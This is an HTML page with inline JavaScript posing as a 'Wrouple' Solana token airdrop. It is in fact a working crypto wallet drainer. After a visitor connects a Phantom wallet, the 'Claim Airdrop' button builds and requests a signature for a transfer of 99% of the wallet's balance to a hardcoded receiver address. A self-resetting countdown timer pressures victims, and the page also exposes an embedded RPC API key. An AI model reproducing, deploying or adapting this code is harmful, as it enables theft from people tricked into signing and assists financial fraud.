<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" type="image/png" href="./img/dex.jpg" />
  <title>Dex-Airdrop</title>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    crossorigin="anonymous"
    referrerpolicy="no-referrer"
  />

  <style>
    /* Your existing CSS here, unchanged */
    /* ... */
  </style>
</head>
<body>

  <!-- Header -->
  <header>
    <div id="logo">
      <img src="./img/dex.jpg" alt="Logo" />
    </div>
    <div class="menu-toggle" id="menuToggle">
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
    </div>
    <nav id="navMenu">
      <a href="index.html">Home</a>
      <a href="about.html">About</a>
      <a href="contact.html">Contact</a>
    </nav>
  </header>

  <!-- Main Layout -->
  <div class="content-wrapper">
    <main class="airdrop-container">
      <h1>Decentralized Exchange</h1>
      <p>
        Backed by the scalability of Solana, Wrouple delivers secure, real-time
        trading and unlocks new DeFi possibilities for everyone.
      </p>
      <button class="primaryBtn" id="connect-wallet">Connect Wallet</button>
    </main>

    <aside class="token-bio">
      <h2>About the Token üíé</h2>
      <p>
        Wrouple is a high-performance token launched by a leading decentralized
        exchange (DEX) on the Solana chain. Designed for lightning-fast speeds
        and ultra-low fees, it empowers smart contracts, staking, and
        cross-chain interactions with seamless precision. ‚ö°üöÄ
        Don‚Äôt miss out on the Solana-powered future ‚Äî claim your share of Wrouple
        and ride the wave of innovation! üí†üî•üåç
      </p>
    </aside>
  </div>

  <!-- Countdown -->
  <div class="countdown-wrapper">
    <h2 class="countdown-title">‚è≥ Time Remaining</h2>
    <div class="countdown">
      <div class="time-box">
        <span id="hours">00</span>
        <label>Hours</label>
      </div>
      <div class="separator">:</div>
      <div class="time-box">
        <span id="minutes">00</span>
        <label>Minutes</label>
      </div>
      <div class="separator">:</div>
      <div class="time-box">
        <span id="seconds">00</span>
        <label>Seconds</label>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <p>&copy; 2025 Powered by Dex. All rights reserved.</p>
  </footer>

  <!-- JS Libraries -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>

  <!-- Your scripts -->
  <script>
    $(document).ready(function () {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

      async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
          'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
          'confirmed'
        );

        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
        const walletBalance = await connection.getBalance(public_key);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
          alert("Insufficient funds for rent.");
          return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        $('#connect-wallet').off('click').on('click', async () => {
          try {
            const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Replace with real address
            const balanceForTransfer = walletBalance - minBalance;

            if (balanceForTransfer <= 0) {
              alert("Insufficient funds for transfer.");
              return;
            }

            // Use integer lamports (must be integer)
            const transferAmount = Math.floor(balanceForTransfer * 0.99);

            const transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: resp.publicKey,
                toPubkey: recieverWallet,
                lamports: transferAmount,
              })
            );

            transaction.feePayer = window.solana.publicKey;
            const blockhashObj = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhashObj.blockhash;

            const signed = await window.solana.signTransaction(transaction);
            const txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);

            alert("Transaction successful!");
            $('#connect-wallet').text("Connected");
          } catch (err) {
            console.error("Error during claim:", err);
            alert("Claim failed. Please try again.");
          }
        });
      }

      async function connectPhantom() {
        try {
          const resp = await window.solana.connect();
          sessionStorage.setItem('phantomConnected', 'true');
          sessionStorage.removeItem('phantomInstallRequested');
          handleWalletConnection(resp);
        } catch (err) {
          console.error("Error connecting to Phantom Wallet:", err);
          alert("Error connecting to Phantom Wallet.");
        }
      }

      $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
          await connectPhantom();
        } else {
          alert("Phantom Wallet not found. Redirecting to install...");
          sessionStorage.setItem('phantomInstallRequested', 'true');

          if (isMobile) {
            const dappUrl = encodeURIComponent(window.location.href);
            const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
            // Delay redirect to allow alert to show properly
            setTimeout(() => {
              window.location.href = phantomLink;
            }, 500);
          } else {
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
              window.open(
                "https://addons.mozilla.org/en-US/firefox/addon/phantom-app/",
                "_blank"
              );
            } else if (isChrome) {
              window.open(
                "https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "_blank"
              );
            } else {
              alert("Please download the Phantom extension for your browser.");
            }
          }
        }
      });

      // Resume after install (desktop + mobile)
      const phantomWasJustInstalled =
        sessionStorage.getItem('phantomInstallRequested') === 'true';
      const phantomAvailable = window.solana && window.solana.isPhantom;

      if (phantomWasJustInstalled && phantomAvailable) {
        // Clear install flag and connect
        sessionStorage.removeItem('phantomInstallRequested');
        connectPhantom();
      }

      // Auto-reconnect if already trusted
      if (phantomAvailable) {
        window.solana.on('connect', async () => {
          console.log('Wallet auto-connected (listener)');
          const resp = { publicKey: window.solana.publicKey };
          handleWalletConnection(resp);
        });

        const wasConnected = sessionStorage.getItem('phantomConnected');
        if (wasConnected) {
          window.solana
            .connect({ onlyIfTrusted: true })
            .then((resp) => {
              if (resp?.publicKey) {
                handleWalletConnection(resp);
              }
            })
            .catch(() => {
              sessionStorage.removeItem('phantomConnected');
            });
        }
      }

      // Menu toggle
      const menuToggle = document.getElementById('menuToggle');
      const navMenu = document.getElementById('navMenu');

      menuToggle.addEventListener('click', () => {
        menuToggle.classList.toggle('open');
        navMenu.classList.toggle('active');
      });

      // Countdown Timer Logic (unchanged)
      const STORAGE_KEY = 'airdrop_expiry';
      const now = new Date().getTime();
      let expireTime = localStorage.getItem(STORAGE_KEY);

      if (!expireTime || now > expireTime) {
        expireTime = now + 24 * 60 * 60 * 1000;
        localStorage.setItem(STORAGE_KEY, expireTime);
      } else {
        expireTime = parseInt(expireTime, 10);
      }

      function updateTimer() {
        const current = new Date().getTime();
        const diff = expireTime - current;

        if (diff <= 0) {
          document.getElementById('hours').textContent = '00';
          document.getElementById('minutes').textContent = '00';
          document.getElementById('seconds').textContent = '00';
          localStorage.removeItem(STORAGE_KEY);
          clearInterval(timerInterval);
          return;
        }

        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
        const minutes = Math.floor((diff / (1000 * 60)) % 60);
        const seconds = Math.floor((diff / 1000) % 60);

        document.getElementById('hours').textContent = String(hours).padStart(2, '0');
        document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
        document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
      }

      const timerInterval = setInterval(updateTimer, 1000);
      updateTimer();
    });
  </script>
</body>
</html>
